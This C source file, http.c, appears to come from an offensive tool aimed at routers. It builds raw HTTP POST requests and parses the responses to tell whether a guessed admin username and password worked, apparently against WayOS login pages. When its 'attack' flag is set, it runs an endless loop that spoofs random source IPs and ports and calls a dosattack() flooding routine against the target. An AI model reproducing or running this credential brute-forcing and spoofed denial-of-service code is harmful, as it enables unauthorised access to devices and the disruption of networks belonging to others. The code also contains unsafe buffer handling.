/* File : http.c
 * Auth : sjin
 * Date : 20141206
 * Mail : 413977243@qq.com
 * -----------------------
 * Rewrite
 * Auth: isinstance
 * Date: 20171031
 * Mail: no
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/time.h>
//#include <time.h>

#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

#include "http.h"
#include "debug.h"
#include "rand.h"
#include "exploit.h"
#include "ahttp.h"

static int http_tcpclient_create(const char *host, int port)
{
    struct hostent *he;
    struct sockaddr_in server_addr;
    int socket_fd;
    // 2017-11-03 add timeout
    /*
    struct timeval timeout;
    */
    int ret;

    if ((he = gethostbyname(host)) == NULL)
    {
        return -1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr = *((struct in_addr *)he->h_addr);

    if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    //if ((socket_fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        printf("Init socket failed\n");
        return -1;
    }

    int flag = 1;
    int len = sizeof(int);
    ret = setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len);
    if (ret != 0)
    {
        printf("Set socket method failed\n");
        return -1;
    }

    int sendbuf = (int)MY_HTTP_DEFAULT_SEND_BUF;

    ret = setsockopt(socket_fd, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    if (ret != 0)
    {
        printf("Set socket method 2 failed\n");
        return -1;
    }

    if (connect(socket_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1)
    {
        printf("Connect socket failed\n");
        return -1;
    }

    return socket_fd;
}

static void http_tcpclient_close(int socket)
{
    //shutdown(socket, SHUT_RDWR);
    close(socket);
}

static int http_tcpclient_recv(int socket, char *lpbuff)
{
    /*
     * This function will return the receive string length
     */
    int recvnum = 0;
    //recvnum = recv(socket, lpbuff, BUFFER_SIZE * 4, 0);
    recvnum = recv(socket, lpbuff, BUFFER_SIZE * 4, 0);
    return recvnum;
}

static int http_tcpclient_send(int socket, char *buff, int size)
{
    /*
     * In this function
     * 'socket' is the socket object to host
     * 'buff' is we want to sending to host string 
     * 'size' is sizeof(buff)
     */
    int sent = 0, tmpres = 0;

    // If the buff not null
    while (size > sent)
    {
        // TODO:
        // Make sure the program had sending all data
        // send(sockfd, buf, len, flags);
        tmpres = send(socket, buff + sent, size - sent, 0);
        if (tmpres == -1)
        {
            printf("Send failed\n");
            return -1;
        }
        sent += tmpres;
    }
    // function will return the sizeof send data bytes
    return sent;
}

static int http_parse_url(const char *url, char *host, char *file, int *port)
{
    /*
     * This function will split the url
     * Example with url = 'http://192.168.20.1:8080/index.html'
     * After parse:
     *    host = "192.168.20.1"
     *    file = "index.html"
     *    port = 8080
     */
    char *ptr1, *ptr2;
    int len = 0;
    if (!url || !host || !file || !port)
    {
        return -1;
    }

    ptr1 = (char *)url;

    if (strncmp(ptr1, "http://", strlen("http://")) == 0)
    {
        // Backware offset
        ptr1 += strlen("http://");
    }
    else
    {
        return -1;
    }

    // Search the characters '/'
    ptr2 = strchr(ptr1, '/');

    // If not found '/'
    // strchr return null
    // Else return point
    if (ptr2)
    {
        // Execute here mean program found the '/'
        // Now ptr1 and ptr2 status is here:
        //       ptr1             ptr2
        //        |                |
        // http://192.168.20.1:8080/index.html
        // len is same as the strlen("192.168.20.1")
        len = strlen(ptr1) - strlen(ptr2);

        // Only copy the IP(192.168.20.1:8080) address to host
        memcpy(host, ptr1, len);

        // Make the position backward the '192.168.20.1:8080' become '\0'
        host[len] = '\0';

        // There sentence is judge the (index.html) is existed or not
        if (*(ptr2 + 1))
        {
            // Copy the 'index.html' to file except the frist character '\'
            memcpy(file, ptr2 + 1, strlen(ptr2) - 1);
            // Fill in the last blank with '\0'
            file[strlen(ptr2) - 1] = '\0';
        }
    }
    else
    {
        // If not existed the '/index.html' string
        // Just copy the ptr1 to host
        memcpy(host, ptr1, strlen(ptr1));
        // Also fill in the last character with '\0'
        host[strlen(ptr1)] = '\0';
    }

    // Now split host and ip
    ptr1 = strchr(host, ':');
    if (ptr1)
    {
        /* Now ptr1 status:
         *            ptr1
         *             |
         * 192.168.20.1:8080
         * -----------------
         * Some important C skill:
         * 'pstr++' is not same as '++ptr1'
         * '*ptr1++ = '\0' excute step:
         * 1. ptr1 = '\0';
         * 2. ptr1 += 1;
         */
        *ptr1++ = '\0';
        // Make the port point to (int)8080
        *port = atoi(ptr1);
    }
    else
    {
        *port = MY_HTTP_DEFAULT_PORT;
    }
    return 0;
}

int http_parse_result(const char *lpbuf, char *rebuf)
{
    /*
     * This function will extract the response's transport data from server
     * If we found the 'flag=0'(mean uncorrect password or username) in data:
     *    Return 1;
     * Other program error:
     *    return -1;
     * If we have the RIGHT password and username(we will not found the 'flag=0' in data):
     *    return 0;
     */

    char *ptmp = NULL;
    char *response = NULL;
    ptmp = (char *)strstr(lpbuf, "HTTP/1.1");

    // WayOS not correct username and password also return the HTTP/1.1
    // If we could NOT found this string in response
    // It mean our targets is not rearchable
    if (!ptmp)
    {
        printf("http/1.1 not found\n");
        return 1;
    }

    // Backward offset 9 characters will point to http status code
    // Extract ONLY the numbers from the last strings
    if (atoi(ptmp + 9) != 200)
    {
        printf("result:\n%s\n", lpbuf);
        return 1;
    }

    // Discovery transport data in response
    ptmp = (char *)strstr(lpbuf, "\r\n\r\n");
    if (!ptmp)
    {
        printf("Response data is NULL\n");
        return 1;
    }
    response = (char *)calloc((strlen(ptmp) + 1), sizeof(char));
    if (!response)
    {
        printf("malloc failed\n");
        return 1;
    }

    // ptmp point to the response's data
    strcpy(response, ptmp + 4);

    //printf("%lu\n", sizeof(response));
    //printf("%s\n", response);

    if (sizeof(response) > MY_HTTP_DEFAULT_RESPONSE_LENGTH)
    {
        printf("The response data more than MY_HTTP_DEFAULT_RESPONSE_LENGTH\n");
        return 1;
    }
    strcpy(rebuf, response);

    // Original code blow
    //return response;
    free(response);
    return 0;
}

//char *http_post(const char *url, const char *post_str, int debug_mode, int not_recv)
void http_post(const struct HTTP_POST_ARG *input)
{
    // Init the input structure
    char *url = input->URL;
    char *post_str = input->PostData;
    int debug_mode = input->DebugMode;
    int attack = input->Attack;

    int socket_fd = -1;
    int port = 0;
    //int i;
    char *lpbuf = calloc((MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100), sizeof(char));
    char host_addr[BUFFER_SIZE] = {'\0'};
    char file[BUFFER_SIZE] = {'\0'};
    char *response_data = NULL;
    char return_string[BUFFER_SIZE] = "lalalafornullvaluereturn?flag=0";
    char *return_str = input->ReturnStr;

    if (!url || !post_str)
    {
        debug(debug_mode, 1, "url or post_str is null, failed...");
        return_str = return_string;
    }
    if (http_parse_url(url, host_addr, file, &port))
    {
        debug(debug_mode, 1, "http_parse_url failed...");
        return_str = return_string;
    }
    //printf("host_addr : %s\nfile:%s\n%d\n", host_addr, file, port);
    socket_fd = http_tcpclient_create(host_addr, port);
    if (socket_fd < 0)
    {
        debug(debug_mode, 1, "http_tcpclient_create failed...");
        return_str = return_string;
    }

    //printf("发送请求:\n%s\n", lpbuf);
    sprintf(lpbuf, HTTP_POST, file, host_addr, port, strlen(post_str), post_str);

    // It's time to recv from server
    // Store the data from server in 'lpbuf'
    // This will not wait and recv the data from server
    if (attack == 1)
    {
        char *rand_ip_addr = (char *)calloc(20, sizeof(char));
        int rport;
        struct AHTTP_INPUT *atmp = (struct AHTTP_INPUT *)malloc(sizeof(struct AHTTP_INPUT));
        debug(debug_mode, 2, "ATTACK!!!!--------------");
        atmp->DstIP = host_addr;
        if (debug_mode == 2)
        {
            atmp->MaxLoop = 10;
        }
        else
        {
            atmp->MaxLoop = -1;
        }
        debug(debug_mode, 2, "Start sending data...");
        for (;;)
        {
            // Here get the rand ip address
            rand_ip(rand_ip_addr);
            atmp->SrcIP = rand_ip_addr;
            rport = rand_port();
            // rport is random source port
            atmp->SrcPort = rport;
            atmp->DstPort = port;
            dosattack(atmp);
        }
        free(atmp);
    }

    // This will wait and recv data and return
    else if (attack != 1)
    {
        sprintf(lpbuf, HTTP_POST, file, host_addr, port, strlen(post_str), post_str);
        // send now
        debug(debug_mode, 1, "Start sending data...");
        if (http_tcpclient_send(socket_fd, lpbuf, strlen(lpbuf)) < 0)
        {
            debug(debug_mode, 1, "http_tcpclient_send failed..");
            //http_tcpclient_close(socket_fd);
            //return return_string;
        }

        if (http_tcpclient_recv(socket_fd, return_string) <= 0)
        {
            debug(debug_mode, 1, "http_tcpclient_recv failed...");
            //http_tcpclient_close(socket_fd);
            //return return_string;
        }
        debug(debug_mode, 1, "Recvevicing the data from server...");

        response_data = (char *)calloc(MY_HTTP_DEFAULT_RESPONSE_LENGTH, sizeof(char));
        if (!response_data)
        {
            debug(debug_mode, 1, "Response malloc failed\n");
            //return return_string;
        }

        // Return value is '0' mean success
        if (http_parse_result(return_string, response_data) != 0)
        {
            debug(debug_mode, 1, "http_parse_result failed\n");
            //return return_string;
        }
        debug(debug_mode, 2, "Start copying the data to buf");
        strcpy(return_str, response_data);
        debug(debug_mode, 2, "End the copy");
        //return response_data;
        //http_tcpclient_close(socket_fd);
    }
    http_tcpclient_close(socket_fd);
    free(lpbuf);
    debug(debug_mode, 2, "End in the http_post");
}

/*
char *http_get(const char *url, int debug_mode, int not_recv)
{
    int socket_fd = -1;
    int port = 0;
    char lpbuf[BUFFER_SIZE * 4] = {'\0'};
    char host_addr[BUFFER_SIZE] = {'\0'};
    char file[BUFFER_SIZE] = {'\0'};
    char *response_data;

    if (!url)
    {
        printf("url is null, failed..\n");
        return NULL;
    }

    if (http_parse_url(url, host_addr, file, &port))
    {
        printf("http_parse_url failed..\n");
        return NULL;
    }
    //printf("host_addr : %s\nfile:%s\n%d\n", host_addr, file, port);

    socket_fd = http_tcpclient_create(host_addr, port);
    if (socket_fd < 0)
    {
        printf("http_tcpclient_create failed..\n");
        return NULL;
    }

    sprintf(lpbuf, HTTP_GET, file, host_addr, port);

    if (http_tcpclient_send(socket_fd, lpbuf, strlen(lpbuf)) < 0)
    {
        printf("http_tcpclient_send failed..\n");
        return NULL;
    }
    //printf("发送请求:\n%s\n", lpbuf);

    if (not_recv != 1)
    {
        if (http_tcpclient_recv(socket_fd, lpbuf) <= 0)
        {
            printf("http_tcpclient_recv failed..\n");
            return NULL;
        }
    }
    http_tcpclient_close(socket_fd);

    response_data = (char *)calloc(MY_HTTP_DEFAULT_RESPONSE_LENGTH, sizeof(char));
    if (!response_data)
    {
        printf("Response malloc failed\n");
        return NULL;
    }
    if (!http_parse_result(lpbuf, response_data))
    {
        printf("http_parse_result faild\n");
        return NULL;
    }

    return response_data;
}
*/

/*
int main(int argc, char *argv[])
{
    // This code is for test

    char *url = "http://192.168.20.1/login.cgi";
    char *post_str = "user=admin&password=root&Submit=%E7%99%BB+%E9%99%86";
    char *return_value = NULL;

    return_value = http_post(url, post_str);
    printf("%s\n", return_value);

    if (http_judge(return_value) == 0)
    {
        printf("We found the password!\n");
        // Do something here
    }
    else
    {
        printf("Not correct password found!\n");
    }

    return 0;
}
*/